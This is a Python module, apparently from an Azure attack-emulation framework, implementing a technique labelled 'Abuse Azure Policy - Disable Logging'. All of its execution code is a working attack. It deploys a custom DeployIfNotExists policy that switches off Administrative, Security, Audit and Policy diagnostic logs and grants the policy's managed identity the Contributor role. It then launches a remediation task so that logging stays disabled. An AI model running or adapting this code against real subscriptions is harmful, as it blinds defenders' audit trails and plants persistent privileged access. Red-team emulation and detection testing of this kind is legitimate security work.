from ..base_technique import BaseTechnique, ExecutionStatus, MitreTechnique, AzureTRMTechnique
from ..technique_registry import TechniqueRegistry
from typing import Dict, Any, Tuple
from azure.mgmt.resource import PolicyClient
from azure.mgmt.authorization import AuthorizationManagementClient
from core.azure.azure_access import AzureAccess
import uuid
import time
import requests

@TechniqueRegistry.register
class AzureAbuseAzurePolicyToDisableLogging(BaseTechnique):
    def __init__(self):
        mitre_techniques = [
            MitreTechnique(
                technique_id="T1562.008",
                technique_name="Impair Defenses",
                tactics=["Defense Evasion"],
                sub_technique_name="Disable or Modify Cloud Logs"
            )
        ]
        azure_trm_technique = [
            AzureTRMTechnique(
                technique_id="AZT508",
                technique_name="Azure Policy",
                tactics=["Persistence"],
                sub_technique_name=None
            )
        ]
        super().__init__("Abuse Azure Policy - Disable Logging", "This technique uses a malicious DeployIfNotExists policy primarily focused on Defense Evasion by impairing logging and monitoring capabilities in Azure through manipulation of the Azure Policy service.", mitre_techniques, azure_trm_technique)

    def execute(self, **kwargs: Any) -> Tuple[ExecutionStatus, Dict[str, Any]]:
        self.validate_parameters(kwargs)
        try:
            resource_group_name: str = kwargs["resource_group_name"]
            az_region: str = kwargs["az_region"]
            policy_definition_name: str = kwargs.get("policy_definition_name", "DisableDiagnosticSettingsPolicy")

            if resource_group_name in [None, ""]:
                return ExecutionStatus.FAILURE, {
                    "error": "Invalid Technique Input",
                    "message": "Invalid Technique Input"
                }
            if az_region in [None, ""]:
                return ExecutionStatus.FAILURE, {
                    "error": {"input_required":"Azure Region"},
                    "message": "Invalid Technique Input"
                }
            if policy_definition_name in [None, ""]:
                policy_definition_name = "DisableDiagnosticSettingsPolicy"

            # Get credential
            credential = AzureAccess.get_azure_auth_credential()
            # Retrieve subscription id
            current_sub_info = AzureAccess().get_current_subscription_info()
            subscription_id = current_sub_info.get("id")

            # create clients
            policy_client = PolicyClient(credential, subscription_id)
            auth_client = AuthorizationManagementClient(credential, subscription_id)

            # Create a policy definition with DeployIfNotExists effect
            policy_definition = {
                "properties": {
                    "displayName": "DeployIfNotExists - Disable Diagnostic Settings",
                    "policyType": "Custom",
                    "mode": "All",
                    "metadata": {
                        "category": "Security"
                    },
                    "parameters": {},
                    "policyRule": {
                        "if": {
                            "field": "type",
                            "equals": "Microsoft.Resources/resourceGroups"
                        },
                        "then": {
                            "effect": "DeployIfNotExists",
                            "details": {
                                "type": "Microsoft.Insights/diagnosticSettings",
                                "deploymentScope": "ResourceGroup",
                                "existenceScope": "ResourceGroup",
                                "existenceCondition": {
                                    "allof": [
                                        {
                                            "field": "Microsoft.Insights/diagnosticSettings/logs.enabled",
                                            "equals": False
                                        }
                                    ]
                                },
                                "deployment": {
                                    "properties": {
                                        "mode": "incremental",
                                        "template": {
                                            "$schema": "https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#",
                                            "contentVersion": "1.0.0.0",
                                            "resources": [
                                                {
                                                    "type": "Microsoft.Insights/diagnosticSettings",
                                                    "apiVersion": "2017-05-01-preview",
                                                    "name": "[concat(parameters('resourceId'), '/disableDiagnosticSettings')]",
                                                    "location": "global",
                                                    "properties": {
                                                        "workspaceId": "fakeWorkspaceId",
                                                        "logs": [
                                                            {
                                                                "category": "Administrative",
                                                                "enabled": False
                                                            },
                                                            {
                                                                "category": "Security",
                                                                "enabled": False
                                                            },
                                                            {
                                                                "category": "Audit",
                                                                "enabled": False
                                                            },
                                                            {
                                                                "category": "Policy",
                                                                "enabled": False
                                                            }
                                                        ]
                                                    }
                                                }
                                            ]
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            }

            policy_definition_result = policy_client.policy_definitions.create_or_update(
                policy_definition_name,
                policy_definition
            )

            print(f"Policy Definition '{policy_definition_result.name}' created.")

            policy_assignment_name = "DisableDiagnosticSettingsPolicyAssignment"

            policy_assignment = policy_client.policy_assignments.create(
                scope=f"/subscriptions/{subscription_id}/resourceGroups/{resource_group_name}",
                policy_assignment_name=policy_assignment_name,
                parameters={
                    "policy_definition_id": policy_definition_result.id,
                    "display_name": "Disable Diagnostic Settings Policy Assignment",
                    "identity": {
                    "type": "SystemAssigned"
                    },
                    "location": az_region
                }
            )

            print(f"Policy '{policy_assignment.name}' assigned to resource group '{resource_group_name}'.")

            # Waiting for changes to replicate
            time.sleep(30)

            # Assign role
            role_assignment_name = str(uuid.uuid4())
            role_assignment_params = {
                "role_definition_id": f"/subscriptions/{subscription_id}/providers/Microsoft.Authorization/roleDefinitions/b24988ac-6180-42a0-ab88-20f7382dd24c",
                "principal_id": policy_assignment.identity.principal_id
            }

            role_assignment = auth_client.role_assignments.create(
                scope=f"/subscriptions/{subscription_id}/resourceGroups/{resource_group_name}",
                role_assignment_name=role_assignment_name,
                parameters=role_assignment_params
            )

            # Create a remediation task using REST API
            remediation_task_name = "RemediateDiagnosticSettings"
            remediation_scope = f"/subscriptions/{subscription_id}/resourceGroups/{resource_group_name}"
            url = f"https://management.azure.com/{remediation_scope}/providers/Microsoft.PolicyInsights/remediations/{remediation_task_name}?api-version=2019-07-01"
            headers = {
                "Authorization": f"Bearer {credential.get_token('https://management.azure.com/.default').token}",
                "Content-Type": "application/json"
            }
            remediation_body = {
                "properties": {
                    "policyAssignmentId": policy_assignment.id,
                    "resourceDiscoveryMode": "ReEvaluateCompliance"
                }
            }

            response = requests.put(url, headers=headers, json=remediation_body)

            if response.status_code == 200 or response.status_code == 201:
                print(f"Remediation task '{remediation_task_name}' created to enforce logging settings.")
            else:
                print(f"Failed to create remediation task: {response.content}")

            # Return results
            return ExecutionStatus.SUCCESS, {
                "message": f"Malicious policy created and assigned, disabling diagnostic settings in resource group '{resource_group_name}', with Contributor role attached. Remediation task created to ensure logging stays disabled.",
                "value": {
                    "policy_name": policy_assignment.name,
                    "target_subscription_id": subscription_id,
                    "target_resource_group": resource_group_name,
                    "role_attached": "Contributor",
                    "remediation_task": remediation_task_name,
                    "message": "Malicious policy created and assigned, with remediation task created to ensure logging stays disabled."
                }
            }
        except Exception as e:
            return ExecutionStatus.FAILURE, {
                "error": str(e),
                "message": "Failed to create malicious policy to disable logging"
            }

    def get_parameters(self) -> Dict[str, Dict[str, Any]]:
        return {
            "resource_group_name": {"type": "str", "required": True, "default": None, "name": "Resource Group Name", "input_field_type" : "text"},
            "az_region": {"type": "str", "required": True, "default": None, "name": "Azure Region", "input_field_type" : "text"},
            "policy_definition_name": {"type": "str", "required": False, "default": "DisableDiagnosticSettingsPolicy", "name": "Policy Definition Name", "input_field_type" : "text"},
        }